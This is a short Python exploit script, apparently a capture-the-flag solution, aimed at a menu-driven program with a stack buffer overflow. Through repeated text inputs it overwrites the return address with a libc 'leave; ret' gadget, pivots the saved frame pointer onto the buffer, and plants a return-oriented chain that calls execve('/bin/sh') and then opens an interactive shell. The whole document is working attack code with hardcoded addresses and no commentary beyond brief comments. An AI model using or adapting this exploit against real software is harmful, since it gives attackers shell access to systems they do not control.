import interact
import struct

def p64(n):
    return struct.pack('Q', n)
    
libc_addr = 0x7f000042c000
stack_addr = 0x7fffffffecd0
bin_sh = 0x7f00005b8d57

gadgets = [
    0x1,
    libc_addr + 0x21102, bin_sh, # mov rdi, bin_sh
    libc_addr + 0x33544, 0x3b,   # mov rax, 0x3b
    libc_addr + 0x01b92, 0x0,    # mov rdx, 0x0
    libc_addr + 0x202e8, 0x0,    # mov rsi, 0x0
    libc_addr + 0xbc375,         # syscall
]

payload = ''
for gadget in gadgets:
    payload += p64(gadget)

p = interact.Process()

# Replace return address with 'leave; ret' gadget in libc
data = p.readuntil('Quit')
p.sendline('1')
data = p.readuntil('Text:')
p.sendline('a'*(128-17) + 'a'*8 + p64(libc_addr + 0x42351))

# Replace rbp with buffer address
data = p.readuntil('Quit')
p.sendline('1')
data = p.readuntil('Text:')
p.sendline('a'*(128-17) + 'a'*7)

data = p.readuntil('Quit')
p.sendline('1')
data = p.readuntil('Text:')
p.sendline('a'*(128-17) + p64(0x7fffffffecd0))

# Insert rop chain into buffer
data = p.readuntil('Quit')
p.sendline('1')
data = p.readuntil('Text:')
p.sendline(payload)

# Run rop
data = p.readuntil('Quit')
p.sendline('1')
data = p.readuntil('Text:')
p.sendline(payload)

data = p.readuntil('Quit')
p.sendline('2')

p.interactive()